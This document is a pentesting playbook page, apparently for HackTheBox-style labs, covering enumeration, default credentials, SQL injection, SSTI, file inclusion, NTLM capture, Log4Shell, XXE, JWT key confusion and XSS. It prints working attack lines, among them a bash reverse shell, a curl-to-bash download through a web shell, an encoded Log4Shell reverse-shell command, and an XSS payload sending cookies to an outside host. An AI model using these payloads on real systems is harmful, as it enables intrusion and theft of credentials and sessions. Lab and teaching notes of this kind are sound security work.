---
slug: /playbooks/pentesting
pagination_next: null
pagination_prev: null
toc_min_heading_level: 2
toc_max_heading_level: 5
---

While performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order)

## Enumeration

Using [nmap](../tooling/nmap) the attacker needs to see what is open in the target machine.

At this stage, we'll behave like a legitimate user, e.g.: perform regular searches, etc...

### Web enumeration

If `nmap` shows some web server, it's worth to check the following enumeration techniques.

#### Directory brute-foce

This is a technique to discover all public paths of a website. There might situation where the web server is serving something but it's not referenced anywhere on the website. This is know as well as dir busting.

The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (e.g. 200 OK) answer to the page. If so, we have discovered a page in that path.

There are many tools to perform this such as [gobuster](../tooling/gobuster) and [ffuf](../tooling/ffuf).

You can use as well the sitemap functionality in the burp suite.

#### Sub-domain brute force

This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server.

Usually this works by providing values in the HTTP Host header.

There are many tools to perform this such as [gobuster](../tooling/gobuster) and [ffuf](../tooling/ffuf).

#### Robots.txt

It's always interesting to check the contents of robots.txt, for instance here, the file reveals the server hosts a joomla CMS:

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

It also gives an idea of possible paths into the application

### SMB enumeration

If `nmap` show the Sambda related ports, you can try to enumerate the Sambda shared and check if they can be accessed anonimously.

```bash
smbclient -L \\<ip> -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
SMB1 disabled -- no workgroup available
```

Check [smbclient](../tooling/smbclient) for refenrece

## Breaking in

This stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. 

At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to discover vulnerabilities.

The attack vector is different to each machine, here you can find most common vector attacks

### Anonymous access

The user might have `ftp` or `tftp` or `smb` shares with anonymous access. It's worth taking a look because those access might leak some valuable information. Additionally, you can also check `metasploit` to check for this kind of access.

### Guess/Brute force credentials

If you discover a login page, why not trying some default user/password combinations? Try the following user/password combinations first:


- admin:admin
- administrator:administrator
- admin:administrator
- admin:password
- administrator:password
- ...


If you are login to a third-party applications it's wise to do a google search for default credentials.

You can try a dictionary attack to bruce force user/password combinations.

You can use a tool like [thc-hydra](https://github.com/vanhauser-thc/thc-hydra). However, this will fail if there if there's any kind of CSRF protection.

### SQL Injection

Poorly programmed queries can be very dangerous and leads to escaping issues in the queries.

If the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.

A typical SQL query for a login page can look like this:

```sql
SELECT * FROM members WHERE username = 'admin' AND password = 'admin'
```

If the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:

```sql
SELECT * FROM members WHERE username = 'admin' #' AND password = 'kjdfjklsdf'
```

Now the query becomes:

```sql
SELECT * FROM members WHERE username = 'admin'
```

therefore, the query is no longer checking for password and the login page is bypassed.

Pay attention when breaking the rest of the query with comments. The standard comment `--` might not always work, it's worth trying another kind of comments like `#`. Also, you might want to URL encode the escaping characters.

SQL injections reference: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet

### Server side template injection (SSTI)

if you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.

If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.

One easy way to test that is to put something like \{\{7*7}} in the template and check for the result.

If the template executes, we'll see the result, out of luck we will see nothing. Or maybe we'll see some trace that reveals the technology behind.

### Arbitrary file upload

This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands as if it was inside the machine.

### File inclusion (LFI,RFI)

Some pages include other pages in order to improve re-usability, e.g. header and footer. If this is not configured properly, an attacker can use the include functionality to read local files.

```
http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
```

You can try to read the following files for Linux:

- /etc/hosts
- /etc/passwd


and for Windows:

- C:/Windows/System32/drivers/etc/hosts
- c:/windows/win.ini

Depending on the inclusion it might lead to Remote File Inclusion, which is execute remote files.

This can be used for example to force the target make a call to a compromised host in the same network and capture the credentials challenge:

```
http://unika.htb/index.php?page=\\10.1.2.3\blabla\
```

### Reverse shell <a name="reverse-shell"></a>

Reverse basically means that it is the target that will initiate a connection request back us (the attacker). 

For example, once we have remote code execution in the target, we'll be able to download and execute a piece of code.

Usually the process is:
1. Create a file in the attacker machine containing a reverse shell payload:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```
2. Create a server in the attacker machine which will act as the shell I/O. Normally this is done with `netcat`.
```bash
nc -nvlp 1337
```
3. Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
```bash
python3 -m http.server 8000
```
4. Make the target machine download and execute the reverse shell payload:
```
http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
```

You can find a list of reverse shells here: https://www.revshells.com/

Once you have shell access, most likely it will not be interactive and you'll miss many functionalities. You can try to get a improve the shell if python is installed:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```


Or, you can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### Rogue servers <a name="rogue"></a>

The idea of rogue server is to start a server in the attacker machine and make the target machine speak with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.

#### NTLM <a name="ntlm"></a>

Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate usersâ€™ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.

In order to mess with it, you might use the [responder](https://github.com/lgandx/Responder) tool.

The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by `responder` tool). This tool will capture the authentication challenge hash and then you can use `john` tool to compare the hash with a dictionary to see if any entry matches.


#### Log4jShell <a name="log4j-shell"></a>

It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from https://github.com/veracode-research/rogue-jndi in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.

E.g.:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
d}|{bash,-i}" --hostname "10.10.14.33"
```
Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.

Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:

```
${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
```

### XML eXternal Entities (XXE)

If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.

This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.

In order to check if the machine is vulnerable to this attack, you can try to show the contents of `/etc/hosts`(Linux) or `C:/Windows/System32/drivers/etc/hosts`(Windows). e.g.:

```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" >]>
<order><quantity>2</quantity><item>&xxe;</item><address>Fake street 1234</address></order>
```

### JWT Key confussion attack

JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...

They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.

This signing and verifing is very important because it ensures that nobody modifies the tokens.

However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.

See the following example:

In the received side, the token is verified using symmetric and asymmetric algorithms:
```javascript
async decode(token) {
    return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
}
```
First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.

This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:

```javascript
const fs = require('fs');
const jwt = require('jsonwebtoken');

const publicKey  = fs.readFileSync('./public.key', 'utf8');
const validJwtToken  = fs.readFileSync('./jwt-token.txt', 'utf8');

decoded = jwt.verify(validJwtToken, publicKey, { algorithms: ["RS256"]})
decoded["username"] = "admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -"
re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'})

console.log(re_encoded)
```
Here, we are using the public key to verify the received token, as the regular way.

Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.

In this case, we are modifying the token to retrieve something from the database using an SQL injection.


### Cross-Site Scripting (XSS) <a name="xss"></a>

This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.

Let's imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.

E.g.
1. Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):
```js
fetch("https://ojm5l9c8.requestrepo.com/?" + document.cookie);
```
2. Write the XSS HTML code in the input form field:
```html
<script src=https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js></script>
```
3. In the remote url (requestrepo), you'll see the value of the `document.cookie`

There's a security header in modern browsers to prevent this `Content Security Policy (CSP)`. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.